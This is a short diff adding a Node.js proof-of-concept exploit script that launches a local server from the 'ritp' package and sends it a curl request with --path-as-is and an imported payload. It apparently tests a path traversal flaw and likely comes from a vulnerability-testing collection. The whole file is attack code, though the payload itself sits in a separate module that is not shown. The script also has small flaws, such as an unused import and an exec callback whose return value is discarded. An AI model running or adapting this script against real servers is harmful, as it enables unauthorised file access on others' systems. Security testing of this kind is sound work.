@@ -1,0 +1,34 @@
+function exploitFunction() {
+    const { exec } = require("child_process");
+    const sleep = require("sleep");
+    const path = require("path"); // Ensure path module is imported
+
+    // Start the server
+    const server = "node ./node_modules/ritp/index.js";
+    exec(server, (error, stdout) => {
+        if (error) {
+            console.error(`Error starting server: ${error}`);
+            return;
+        }
+
+        // Sleep for 2 seconds to ensure the server is up
+        sleep.sleep(2);
+
+        // Craft the attack string
+        const genstr = require("./payload").getPayload();
+        const attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr}"`;
+
+        // Execute the attack string
+        exec(attack_string, (error, stdout) => {
+            if (error) {
+                console.error(`Attack failed: ${error}`);
+                return;
+            }
+
+            // Return the output of the attack
+            return stdout;
+        });
+    });
+}
+
+module.exports = { exploitFunction };
